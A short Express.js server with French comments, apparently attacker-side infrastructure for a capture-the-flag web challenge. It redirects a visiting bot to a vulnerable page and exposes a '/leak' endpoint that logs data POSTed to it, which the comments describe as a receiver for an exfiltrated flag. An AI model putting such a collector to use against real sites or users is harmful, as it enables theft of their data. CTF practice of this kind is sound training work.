const express = require('express');
const app = express();
const port = 3000; // ou process.env.PORT si déployé sur Render, Vercel, etc.

app.use(express.urlencoded({ extended: false }));

// Log toutes les requêtes
app.use((req, res, next) => {
  console.log(`[+] ${req.method} ${req.url} from ${req.ip}`);
  next();
});

// Page principale redirige le bot vers le site vulnérable
app.get('/', (req, res) => {
  const target = '/spaceship/3';
  console.log(`[!] Redirecting to ${target}`);
  res.set('Content-Type', 'text/html');
  res.send(`
    <html>
      <head>
        <meta http-equiv="refresh" content="0;url=${target}" />
      </head>
      <body>
        <p>If you're not redirected automatically, <a href="${target}">click here</a>.</p>
      </body>
    </html>
  `);
});

// Pour logguer les tentatives de vol (si tu arrives à faire exfiltrer le flag)
app.post('/leak', (req, res) => {
  console.log('[LEAK] Received data:');
  console.log(req.body);
  res.send('OK');
});

app.listen(port, () => {
  console.log(`[*] Server listening on http://localhost:${port}`);
});
